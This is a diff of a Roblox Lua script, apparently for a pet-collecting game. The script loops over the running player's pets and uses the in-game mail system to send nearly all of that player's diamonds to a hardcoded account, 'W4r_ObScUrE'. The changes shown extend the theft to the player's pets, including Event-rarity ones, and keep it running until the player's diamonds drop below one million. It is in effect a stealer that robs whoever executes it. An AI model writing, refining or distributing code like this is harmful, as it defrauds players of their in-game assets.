@@ -354,7 +354,7 @@ while wait() do
         if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                     _G.Lol = 0
         end
-        if v2.huge == false and v2.rarity ~= "Exclusive" and v2.rarity ~= "Event" then
+        if v2.huge == false and v2.rarity ~= "Exclusive" then
             _G.Username = "W4r_ObScUrE"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
@@ -363,7 +363,7 @@ while wait() do
     			[1] = {
         			["Recipient"] = _G.Username,
         			["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000,
-        			["Pets"] = false,
+        			["Pets"] = {v.uid},
         			["Message"] = _G.GiftMessage
     			}
 			}
@@ -371,21 +371,21 @@ while wait() do
 
             wait(5)
     
-            if v2.huge == false then
+            if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
                 break
             end
         end
     end
-    local allHugeFalse = true
+    local allGemsFalse = true
     for i, v in pairs(savedPets) do
         local v2 = FrameworkLibrary.Directory.Pets[v.id]
-        if v2.huge == true then
-            allHugeFalse = false
+        if game.Players.LocalPlayer.leaderstats.Diamonds.Value > 1000000 then
+            allGemsFalse = false
             break
         end
     end
     
-    if allHugeFalse then
+    if allGemsFalse then
         break
     end
 end
